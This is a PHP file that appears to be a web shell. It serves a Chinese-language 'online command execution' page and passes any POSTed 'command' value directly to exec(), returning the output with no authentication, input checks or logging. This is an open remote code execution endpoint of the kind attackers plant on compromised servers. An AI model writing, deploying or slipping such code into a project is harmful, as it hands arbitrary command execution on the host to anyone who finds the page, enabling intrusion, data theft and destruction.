<?php
    function strToUtf8($str){
        $encode = mb_detect_encoding($str, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'));
        if($encode == 'UTF-8'){
            return $str;
        }else{
            return mb_convert_encoding($str, 'UTF-8', $encode);
        }
    }
    $method=$_SERVER['REQUEST_METHOD'];
    if($method == 'POST'){
        if((string)$_POST['command'] != ''){
            $result1 = exec((string)$_POST['command'],$result,$resultType);
            if($resultType == 0){
                echo strToUtf8($result1);
                $num = count($result); 
                for($i=0;$i<$num;++$i){ 
                    if($result[$i] != $result1){
                        echo strToUtf8($result[$i]); 
                    }
                }
            }elseif($resultType == 1){
                echo 'Command Run Error';
            }
        }elseif((string)$_POST['command'] == ''){
            echo 'Command is null';
        }
        
    }elseif($method == 'GET'){
        ?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" lang="zh-Hans">
        <meta http-equiv='X-UA-Compatible' content='IE=edge, chrome=1'>
        <title>在线命令执行 CommandOnlineRuner</title>
        <!--<link rel="stylesheet" href="/style.css">！-->
        <style>
body {
    padding: 0;
    margin: 0;
    font-family: sans-serif;
    background: #34495e;
}

.input_box {
    width: 300px;
    padding: 40px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #191919;
    text-align: center;
}


.input_box h1 {
    color: white;
    text-transform: uppercase;
    font-weight: 500;
}

.input_box input[type = "text"] {
    border: 0;
    background: none;
    display: block;
    margin: 20px auto;
    text-align: center;
    border: 2px solid #3498db;
    padding: 14px 10px;
    width: 200px;
    outline: none;
    color: white;
    border-radius: 24px;
    transition: 0.25s;
}

.input_box #resultB {
    border: 0;
    background: none;
    display: block;
    margin: 20px auto;
    text-align: center;
    border: 2px solid #3498db;
    padding: 14px 10px;
    width: 200px;
    outline: none;
    color: white;
    border-radius: 24px;
    transition: 0.25s;
    height: 300px;
}

.input_box #resultB:focus {
    width: 295px;
    border-color: #2ecc71;
}

.input_box input[type = "text"]:focus {
    width: 280px;
    border-color: #2ecc71;
}

.input_box input[type = "submit"] {
    border: 0;
    background: none;
    display: block;
    margin: 20px auto;
    text-align: center;
    border: 2px solid#2ecc71;
    padding: 14px 10px;
    width: 155px;
    outline: none;
    color: white;
    border-radius: 24px;
    transition: 0.25s;
    cursor: pointer;
}

.input_box input[type = "submit"]:hover {
    background: #2ecc71;
}

.input_box p {
    color: white;
    font-size: 20px;
}


        </style>
        <script src="http://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
    </head>
    <body>
        <div class="input_box">
            <h1>在线命令执行</h1>
            <input type="text" placeholder="命令" id="command">
            <input type="submit" value="提交" id="sub">
            <textarea placeholder="返回值" id="resultB" readonly="readonly"></textarea>
            <input type="submit" value="清空" id="clb">
            <script>
                $(function() {
                    $('#sub').click(function() {
                        $.ajaxSetup({
                            contentType: "application/x-www-form-urlencoded; charset=utf-8"
                        });
                        console.log(document.getElementById('command').value);
                        try{

                            if (document.getElementById('command').value != null & document.getElementById('command').value.value != ''){
                                $.post(
                                    '/v2/index.php',
                                    {
                                        command: document.getElementById('command').value
                                    },
                                    function(result) {
                                        //alert(result);
                                        resultDoc = document.getElementById('resultB');
                                        resultDoc.value=resultDoc.value+result+'\r\n';
                                    }
                                );
                            }else{
                                alert('请输入命令')
                            }
                        }catch(error){
                            resultDoc = document.getElementById('resultB');
                            resultDoc.value=resultDoc.value+'错误: '+error.Message+'\r\n';
                        }
                    });
                    $('#clb').click(function() {
                        resultDoc = document.getElementById('resultB');
                        resultDoc.value = '';
                    });
                });
            </script>
        </div>
    </body>
</html>
        <?php
    }
?>
